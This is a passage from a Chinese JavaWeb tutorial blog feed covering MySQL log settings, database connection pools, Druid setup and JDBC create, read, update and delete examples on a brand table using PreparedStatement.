12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>log-output=FILE</p><p>general-log=1</p><p>general_log_file=“D:\mysql.log”</p><p>slow-query-log=1</p><p>slow_query_log_file=“D:\mysql_slow.log”</p><p>long_query_time=2</p></blockquote><h1 id="4-数据库连接池"><a class="markdownIt-Anchor" href="#4-数据库连接池">#</a> 4、数据库连接池</h1><ul><li>数据链接池简介</li><li>Druid 数据库连接池</li></ul><h2 id="41-数据库连接池简介"><a class="markdownIt-Anchor" href="#41-数据库连接池简介">#</a> 4.1 数据库连接池简介</h2><ul><li>数据库连接池是个容器，负责分配、管理数据库连接（connection）</li><li>它允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个</li><li>释放空闲时间超过最大空闲时间的数据库连接来避免因为没有释放数据库连接而引起的数据库连接遗漏</li><li>好处：<ul><li>资源重用</li><li>提升系统响应速度</li><li>避免数据库连接遗漏</li></ul></li></ul><h2 id="42-数据库连接池实现"><a class="markdownIt-Anchor" href="#42-数据库连接池实现">#</a> 4.2 数据库连接池实现</h2><ul><li>标准接口：DataSource<ul><li>官方（SUN）提供的数据库连接池标准接口，由第三方组织实现此接口</li><li>功能：获取连接</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Connection</span> <span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>常见的数据库连接池：<ul><li>DBCP</li><li>C3P0</li><li>Druid</li></ul></li><li>Druid (德鲁伊)：<ul><li>Druid 连接池是阿里巴巴开源的数据库连接池项目</li><li>功能强大，性能优秀，是 Java 语言最好的数据库连接池之一</li></ul></li></ul><h2 id="43-druid使用步骤"><a class="markdownIt-Anchor" href="#43-druid使用步骤">#</a> 4.3 Druid 使用步骤</h2><ol><li>导入 jar 包</li><li>定义配置文件</li><li>加载配置文件</li><li>获取数据库连接池对象</li><li>获取连接</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>druid</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span><span class="token class-name">DruidDataSourceFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DataSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span><span class="token comment">/** * Druid数据库连接池演示 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DruidDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1.导入jar包</span>        <span class="token comment">//2.定义配置文件</span>        <span class="token comment">//3.加载配置文件</span>        <span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src/druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.获取连接池对象</span>        <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//5.获取对应数据库连接</span>        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>connection<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取当前工作路径，用来判断导入文件时的路径</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="练习"><a class="markdownIt-Anchor" href="#练习">#</a> 练习</h1><p>完成商品品牌数据的增删改查操作</p><ul><li><p>查询：查询所有数据</p></li><li><p>添加：添加品牌</p></li><li><p>修改：根据 id 修改</p></li><li><p>删除：根据 id 删除</p></li><li><p>准备环境：</p><ul><li>数据库表：tb_brand</li><li>实体类 Brand</li><li>测试用例</li></ul></li></ul><h2 id="1-查询所有数据"><a class="markdownIt-Anchor" href="#1-查询所有数据">#</a> 1、查询所有数据</h2><ol><li>获取 Connection</li><li><strong>定义 SQL</strong>：select * from tb_brand;</li><li>获取 PreparedStetement 对象</li><li><strong>设置参数</strong>：不需要</li><li>执行 SQL</li><li><strong>处理结果</strong>：List&lt;Brand&gt;</li><li>释放资源</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span><span class="token class-name">DruidDataSourceFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Brand</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DataSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">PreparedStatement</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ResultSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BrandTest</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 查询所有     * 核心思想：     * 1.select * from tb_brand;     * 2.参数：不需要     * 3.结果：Lsit&lt;Brand>     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testSelectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1.获取Connection</span>        <span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src/druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>connection<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.定义SQL语句</span>        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from tb_brand;"</span><span class="token punctuation">;</span>        <span class="token comment">//3.获取PreparedStatement对象</span>        <span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.设置参数——无参数</span>        <span class="token comment">//5.执行SQL</span>        <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//6.处理结果</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Brand</span><span class="token punctuation">></span></span> brands <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Brand</span> brand <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Integer</span> id <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> brandName <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"brand_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> companyName <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"company_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Integer</span> ordered <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"ordered"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> description <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"description"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Integer</span> status <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"status"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            brand <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Brand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setBrandName</span><span class="token punctuation">(</span>brandName<span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setCompanyName</span><span class="token punctuation">(</span>companyName<span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setOrdered</span><span class="token punctuation">(</span>ordered<span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setDescription</span><span class="token punctuation">(</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>            brands<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>brand<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//7.释放资源</span>        resultSet<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>brands<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-添加数据"><a class="markdownIt-Anchor" href="#2-添加数据">#</a> 2、添加数据</h2><ol><li>编写 SQL 语句</li><li>是否需要参数？需要，除了 ID 之外的所有参数</li><li>返回结果如何封装？boolean</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//接收页面提交的参数</span>        <span class="token class-name">String</span> brandName <span class="token operator">=</span> <span class="token string">"香飘飘"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> companyName <span class="token operator">=</span> <span class="token string">"香飘飘"</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ordered <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> description <span class="token operator">=</span> <span class="token string">"绕地球一圈"</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> status <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">//1.获取Connection</span>        <span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src/druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>connection<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.定义SQL语句</span>        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"insert into tb_brand(brand_name,company_name,ordered,description,status) values(?,?,?,?,?)"</span><span class="token punctuation">;</span>        <span class="token comment">//3.获取PreparedStatement对象</span>        <span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.设置参数</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>brandName<span class="token punctuation">)</span><span class="token punctuation">;</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>companyName<span class="token punctuation">)</span><span class="token punctuation">;</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>ordered<span class="token punctuation">)</span><span class="token punctuation">;</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//5.执行SQL</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//6.处理结果</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//7.释放资源</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-根据id修改"><a class="markdownIt-Anchor" href="#3-根据id修改">#</a> 3、根据 ID 修改</h2><ol><li>编写 sql 语句</li><li>是否需要参数？需要：Brand 对象所有数据</li><li>返回结果如何封装？boolean</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//接收页面提交的参数</span>    <span class="token class-name">String</span> brandName <span class="token operator">=</span> <span class="token string">"香飘飘"</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> companyName <span class="token operator">=</span> <span class="token string">"香飘飘"</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ordered <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> description <span class="token operator">=</span> <span class="token string">"绕地球三圈"</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> status <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> id <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token comment">//1.获取Connection</span>    <span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src/druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Connection</span> connection <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>connection<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//2.定义SQL语句</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"update tb_brand set brand_name=?,company_name=?,ordered=?,description=?,status=? where id=?;"</span><span class="token punctuation">;</span>    <span class="token comment">//3.获取PreparedStatement对象</span>    <span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//4.设置参数</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>brandName<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>companyName<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>ordered<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//5.执行SQL</span>    <span class="token keyword">int</span> count <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//6.处理结果</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//7.释放资源</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-根据id修改"><a class="markdownIt-Anchor" href="#4-根据id修改">#</a> 4、根据 ID 修改</h2><ol><li>编写 SQL 语句</li><li>是否需要参数？需要，id</li><li>返回结果如何处理？boolean</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testDelete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src/druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Connection</span> connection <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"delete from tb_brand where id=?;"</span><span class="token punctuation">;</span>    <span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-jdbc简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-jdbc简介&quot;&gt;#&lt;/a&gt; 1、JDBC 简介&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;JDBC 概念&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JDBC 就是使用 Java 语言操作关系</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-数据库</title>
    <link href="http://example.com/post/JavaWeb-%E6%95%B0%E6%8D%AE%E5%BA%93.html"/>
